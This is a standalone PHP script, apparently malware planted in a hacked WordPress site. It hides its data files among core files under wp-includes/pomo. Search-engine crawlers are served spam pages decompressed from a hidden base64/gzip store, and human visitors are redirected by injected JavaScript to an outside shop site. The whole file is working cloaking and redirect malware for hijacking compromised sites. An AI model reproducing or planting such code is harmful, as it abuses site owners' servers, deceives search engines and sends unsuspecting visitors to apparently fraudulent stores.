<?php
ini_set("error_reporting","E_ALL & ~E_NOTICE");
$url=$_SERVER['REQUEST_URI'];
$dir=dirname($url);
  if (strlen($dir)>1){
  $url=str_replace($dir."/","",$url);
  }
  else
  {
  $url=substr($url,1);
  }
$lailu= $_SERVER["HTTP_REFERER"];
$zhizhu=$_SERVER["HTTP_USER_AGENT"];
$home="http://www.pascherbagsfr.com/";
 if (strpos($url, "?zenid=") == true)
  {
  
  $x=explode("?zenid=",$url);
  $url=$x[0];
  }

$dir=str_replace("/wp-admin","",getcwd());
$dir=str_replace("\wp-admin","",getcwd());
$data=$dir.'/wp-includes/pomo/lv-fr.log';

if($url=="sitemap3.xml"){
header("HTTP/1.1 200 OK");
header("Content-type: text/xml");
$sitemap=$dir."/wp-includes/pomo/".$url;
$xmldata= file_get_contents($sitemap);
echo $xmldata;
die();
}

$c="";
$lines = file_get_contents($data);
ini_set('memory_limit', '-1');
$line=explode("\n",$lines);
$i=0;
foreach($line as $key =>$li)
{
  if($li<>""){
  $a=explode("|*|",$li);
  $a[0]=str_replace(".html","/",$a[0]);
  if($a[0]==$url){
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'],0,4);
if(isbot()) {
$zt='1';
}elseif($lang){
$zt='2';
}
elseif($lailu){
$zt='3';
}else{
$zt='4';
}
switch($zt){
case '1':
break;
case '2':
echo "<script> location.href='".$home.$url."';</script>";
exit;
break;
case '3':
echo "<script> location.href='".$home.$url."';</script>";
exit;
break;
case '4':
break;
}
  $max=count($line);
  if ($i-2>=0){
    $p2=gethref($line,$i-2);
  }
  if ($i-1>=0){
    $p1=gethref($line,$i-1);
  }
  if ($i+1<=$max){
    $n1=gethref($line,$i+1);
  }
  if ($i+2<=$max){
    $n2=gethref($line,$i+2);
  }

  $morelinks=$p2."<br>".$p1."<br>".$n1."<br>".$n2;
  header("HTTP/1.1 200 OK");
  $c=gzuncompress(base64_decode($a[1]));
  $b=explode("|*|",$c);
  $title=$b[0];
  $contents=$b[1];
  $meta_title=$b[2];
  $meta_description=$b[3];
  $meta_description=str_replace("\"","",$meta_description);
  $meta_keywrods=$b[4];
  $image=$b[5];
  $image="<img src=\"".$home."images/".$image."\" width=400 title=\"".$title."\" alt=\"".$title."\"><br>";
  $moban=getcwd().'/wp-includes/pomo/moban.html';
  $html = file_get_contents($moban);
  $html=str_replace("{pname}","$title",$html);
  $html=str_replace("{content}","$contents",$html);
  $html=str_replace("{title}","$meta_title",$html);
  $html=str_replace("{description}","$meta_description",$html);
  $html=str_replace("{keywords}","$meta_keywrods",$html);
  $html=str_replace("{ppage2}","$p2",$html);
  $html=str_replace("{ppage1}","$p1",$html);
  $html=str_replace("{npage1}","$n1",$html);
  $html=str_replace("{npage2}","$n2",$html);
  $html=str_replace("{image}","",$html);
  $html=str_replace("{morelinks}","$morelinks",$html);
  $html=str_replace(".html","/",$html);
  echo $html;
  die();
  }
  $i=$i+1;
  }
}

?>